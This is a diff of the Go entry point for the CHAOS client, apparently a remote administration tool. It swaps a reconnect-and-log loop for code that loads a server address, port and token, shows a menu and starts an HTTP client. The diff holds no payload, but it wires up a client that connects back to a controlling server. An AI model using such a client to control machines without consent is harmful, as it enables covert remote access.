@@ -1,34 +1,23 @@
 package main
 
 import (
-	log "github.com/sirupsen/logrus"
 	"github.com/tiagorlampert/CHAOS/client/app"
-	"github.com/tiagorlampert/CHAOS/client/app/util"
-	"time"
+	"github.com/tiagorlampert/CHAOS/client/app/shared/environment"
+	"github.com/tiagorlampert/CHAOS/client/app/ui"
+	"github.com/tiagorlampert/CHAOS/client/app/util/network"
 )
 
 var (
-	ServerAddress = ""
+	Version       = "dev"
 	ServerPort    = ""
+	ServerAddress = ""
+	Token         = ""
 )
 
 func main() {
-	for {
-		log.WithFields(log.Fields{
-			"address": ServerAddress,
-			"port":    ServerPort,
-		}).Info("starting new connection with server")
+	ui.ShowMenu(Version)
+	appConfiguration := environment.LoadConfiguration(ServerAddress, ServerPort, Token)
 
-		newApp, err := app.NewApp(ServerAddress, ServerPort)
-		if err != nil {
-			log.WithField("cause", err.Error()).Error("error starting app")
-			time.Sleep(util.TimeSleep)
-			continue
-		}
-
-		if err := newApp.Run(); err != nil {
-			log.WithField("cause", err.Error()).Error("error running app")
-			time.Sleep(util.TimeSleep)
-		}
-	}
+	httpClient := network.NewHttpClient(10)
+	app.NewApp(httpClient, appConfiguration).Run()
 }
